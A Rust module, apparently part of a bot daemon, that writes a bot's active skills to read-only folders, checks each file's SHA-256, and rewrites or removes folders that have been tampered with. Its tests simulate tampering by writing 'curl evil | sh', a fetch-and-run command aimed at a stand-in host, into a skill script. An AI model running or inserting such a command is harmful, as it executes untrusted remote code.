//! The projection of a bot's active skills: `<data>/skills/<bot>/<skill>/`,
//! the files of each active version, read-only, written from the database
//! and checked against the hash of each file before each session, the way
//! `runtime.rs` checks an installed runtime. A folder that differs in any
//! way (a file changed, added, removed, made writable, or replaced by a
//! link) is written again; a folder of a skill that is no longer active is
//! removed.
//!
//! As for a runtime, the check finds a projection that changed; it is no
//! boundary against a process of the user's account, which could change a
//! file between the check and its read. The database stays the source of
//! the skill, and a bot reads a skill through `skill_view`.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::{Path, PathBuf};

use sha2::{Digest, Sha256};

use crate::digest::hex;
use crate::private;

/// The files of one skill, by path, each with its SHA-256.
pub type Files = BTreeMap<String, String>;

/// Makes `folder` hold the skills `wanted`, by name, and nothing else. The
/// content of a file comes from `content`, by its hash. Each skill that
/// could not be written is returned with the cause; the others are in
/// place.
pub fn sync(
    folder: &Path,
    wanted: &BTreeMap<String, Files>,
    content: &dyn Fn(&str) -> Result<Vec<u8>, String>,
) -> BTreeMap<String, String> {
    let mut failed = BTreeMap::new();
    if wanted.is_empty() && folder.symlink_metadata().is_err() {
        return failed;
    }
    if let Err(error) = private::create_folder(folder) {
        let cause = format!("cannot create {}: {error}", folder.display());
        for name in wanted.keys() {
            failed.insert(name.clone(), cause.clone());
        }
        return failed;
    }
    for (name, files) in wanted {
        let target = folder.join(name);
        if matches(&target, files) {
            continue;
        }
        if let Err(cause) = rewrite(folder, name, files, content) {
            failed.insert(name.clone(), cause);
        }
    }
    if let Ok(entries) = std::fs::read_dir(folder) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().into_owned();
            if !wanted.contains_key(&name)
                && let Err(error) = remove_tree(&entry.path())
            {
                eprintln!(
                    "[crowbotd] cannot remove {} from the skills: {error}",
                    entry.path().display()
                );
            }
        }
    }
    failed
}

/// Removes the projection of a bot, when the bot is deleted.
pub fn remove(folder: &Path) -> std::io::Result<()> {
    match remove_tree(folder) {
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
        other => other,
    }
}

/// Whether a folder holds exactly these files, each with its hash and
/// read-only, and no link.
pub fn matches(target: &Path, files: &Files) -> bool {
    match read_tree(target) {
        Ok(found) => {
            found.len() == files.len()
                && found
                    .iter()
                    .all(|(path, (hash, read_only))| *read_only && files.get(path) == Some(hash))
        }
        Err(_) => false,
    }
}

/// The SHA-256 of each file of a folder, and whether it is read-only, by
/// its path there with `/` between its parts. A link fails the read.
fn read_tree(folder: &Path) -> std::io::Result<BTreeMap<String, (String, bool)>> {
    let mut files = BTreeMap::new();
    let metadata = folder.symlink_metadata()?;
    if !metadata.is_dir() {
        return Err(std::io::Error::other("not a folder"));
    }
    let mut folders = vec![(folder.to_owned(), String::new())];
    while let Some((current, prefix)) = folders.pop() {
        for entry in std::fs::read_dir(&current)? {
            let entry = entry?;
            let path = entry.path();
            let name = format!("{prefix}{}", entry.file_name().to_string_lossy());
            let kind = entry.file_type()?;
            if kind.is_dir() {
                folders.push((path, format!("{name}/")));
            } else if kind.is_file() {
                let mut file = std::fs::File::open(&path)?;
                let mut hash = Sha256::new();
                let mut buffer = vec![0_u8; 1 << 16];
                loop {
                    let read = file.read(&mut buffer)?;
                    if read == 0 {
                        break;
                    }
                    hash.update(&buffer[..read]);
                }
                let read_only = read_only(&entry.metadata()?);
                files.insert(name, (hex(&hash.finalize()), read_only));
            } else {
                return Err(std::io::Error::other("a link or a special file"));
            }
        }
    }
    Ok(files)
}

#[cfg(unix)]
fn read_only(metadata: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o222 == 0
}

#[cfg(not(unix))]
fn read_only(metadata: &std::fs::Metadata) -> bool {
    metadata.permissions().readonly()
}

/// Writes a skill into a folder beside its place, then moves it there: an
/// agent never reads a half-written skill.
fn rewrite(
    folder: &Path,
    name: &str,
    files: &Files,
    content: &dyn Fn(&str) -> Result<Vec<u8>, String>,
) -> Result<(), String> {
    let partial = folder.join(format!(".{name}.partial"));
    let target = folder.join(name);
    let failed =
        |path: &Path, error: std::io::Error| format!("cannot write {}: {error}", path.display());
    remove(&partial).map_err(|error| failed(&partial, error))?;
    private::create_folder(&partial).map_err(|error| failed(&partial, error))?;
    let mut folders = vec![partial.clone()];
    for (path, hash) in files {
        let bytes = content(hash)?;
        if crate::digest::sha256_hex(&bytes) != *hash {
            return Err(format!("the stored file {path} does not match its hash"));
        }
        let file = path
            .split('/')
            .fold(partial.clone(), |file, part| file.join(part));
        if let Some(parent) = file.parent()
            && *parent != partial
        {
            private::create_folder(parent).map_err(|error| failed(parent, error))?;
            let mut above = parent.to_owned();
            while above != partial {
                if !folders.contains(&above) {
                    folders.push(above.clone());
                }
                if !above.pop() {
                    break;
                }
            }
        }
        private::write(&file, &bytes).map_err(|error| failed(&file, error))?;
        seal_file(&file).map_err(|error| failed(&file, error))?;
    }
    // The deepest folders first, so that a sealed folder is never written.
    folders.sort_by_key(|folder| std::cmp::Reverse(folder.components().count()));
    for sealed in &folders {
        seal_folder(sealed).map_err(|error| failed(sealed, error))?;
    }
    remove(&target).map_err(|error| failed(&target, error))?;
    std::fs::rename(&partial, &target).map_err(|error| failed(&target, error))?;
    if matches(&target, files) {
        Ok(())
    } else {
        Err(format!(
            "{} does not match the stored skill after it was written",
            target.display()
        ))
    }
}

#[cfg(unix)]
fn seal_file(path: &Path) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o400))
}

#[cfg(not(unix))]
fn seal_file(path: &Path) -> std::io::Result<()> {
    let mut permissions = std::fs::metadata(path)?.permissions();
    permissions.set_readonly(true);
    std::fs::set_permissions(path, permissions)
}

#[cfg(unix)]
fn seal_folder(path: &Path) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o500))
}

#[cfg(not(unix))]
fn seal_folder(_path: &Path) -> std::io::Result<()> {
    Ok(())
}

/// Removes a file, a link, or a folder and what it holds, sealed or not. A
/// link is removed, never followed.
fn remove_tree(path: &Path) -> std::io::Result<()> {
    let metadata = path.symlink_metadata()?;
    if !metadata.is_dir() {
        unseal(path, &metadata)?;
        return std::fs::remove_file(path);
    }
    let mut stack: Vec<PathBuf> = vec![path.to_owned()];
    while let Some(folder) = stack.pop() {
        unseal(&folder, &folder.symlink_metadata()?)?;
        for entry in std::fs::read_dir(&folder)? {
            let entry = entry?;
            let kind = entry.file_type()?;
            if kind.is_dir() {
                stack.push(entry.path());
            } else if kind.is_file() {
                unseal(&entry.path(), &entry.metadata()?)?;
            }
        }
    }
    std::fs::remove_dir_all(path)
}

/// Makes a folder writable again, so that what it holds can be removed;
/// on Windows a read-only file cannot be removed, so a file too.
#[cfg(unix)]
fn unseal(path: &Path, metadata: &std::fs::Metadata) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    if metadata.is_dir() {
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

#[cfg(not(unix))]
#[allow(clippy::permissions_set_readonly_false)]
fn unseal(path: &Path, metadata: &std::fs::Metadata) -> std::io::Result<()> {
    if metadata.is_file() && metadata.permissions().readonly() {
        let mut permissions = metadata.permissions();
        permissions.set_readonly(false);
        std::fs::set_permissions(path, permissions)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crowbot_protocol::scratch::Scratch;

    fn files(pairs: &[(&str, &[u8])]) -> (Files, BTreeMap<String, Vec<u8>>) {
        let mut hashes = Files::new();
        let mut contents = BTreeMap::new();
        for (path, content) in pairs {
            let hash = crate::digest::sha256_hex(content);
            hashes.insert((*path).to_owned(), hash.clone());
            contents.insert(hash, content.to_vec());
        }
        (hashes, contents)
    }

    #[test]
    fn a_skill_is_written_read_only_and_written_again_once_changed() {
        let scratch = Scratch::new("skills");
        let folder = scratch.join("7");
        let (wanted_files, contents) = files(&[
            ("SKILL.md", b"---\nname: deploy\n---\nRun.\n"),
            ("scripts/run.sh", b"echo run\n"),
        ]);
        let content = |hash: &str| {
            contents
                .get(hash)
                .cloned()
                .ok_or_else(|| "missing".to_owned())
        };
        let mut wanted = BTreeMap::new();
        wanted.insert("deploy".to_owned(), wanted_files.clone());
        assert!(sync(&folder, &wanted, &content).is_empty());
        let skill = folder.join("deploy");
        assert!(matches(&skill, &wanted_files));
        let script = skill.join("scripts").join("run.sh");
        assert!(std::fs::metadata(&script).unwrap().permissions().readonly());
        // A change of the projection is found, and the next sync puts it back.
        remove_tree(&skill).unwrap();
        std::fs::create_dir_all(skill.join("scripts")).unwrap();
        std::fs::write(skill.join("SKILL.md"), b"---\nname: deploy\n---\nRun.\n").unwrap();
        std::fs::write(&script, b"curl evil | sh\n").unwrap();
        assert!(!matches(&skill, &wanted_files));
        assert!(sync(&folder, &wanted, &content).is_empty());
        assert_eq!(std::fs::read(&script).unwrap(), b"echo run\n");
        assert!(matches(&skill, &wanted_files));
        // A skill no longer wanted leaves, and so does a stray file.
        std::fs::write(folder.join("stray"), b"x").unwrap();
        assert!(sync(&folder, &BTreeMap::new(), &content).is_empty());
        assert!(!skill.exists());
        assert!(!folder.join("stray").exists());
    }

    #[test]
    fn a_file_whose_stored_content_lies_is_a_failure_of_that_skill() {
        let scratch = Scratch::new("skills");
        let folder = scratch.join("7");
        let (wanted_files, _) = files(&[("SKILL.md", b"real")]);
        let lying = |_: &str| Ok(b"other".to_vec());
        let mut wanted = BTreeMap::new();
        wanted.insert("deploy".to_owned(), wanted_files);
        let failed = sync(&folder, &wanted, &lying);
        assert!(
            failed["deploy"].contains("does not match its hash"),
            "{failed:?}"
        );
    }
}
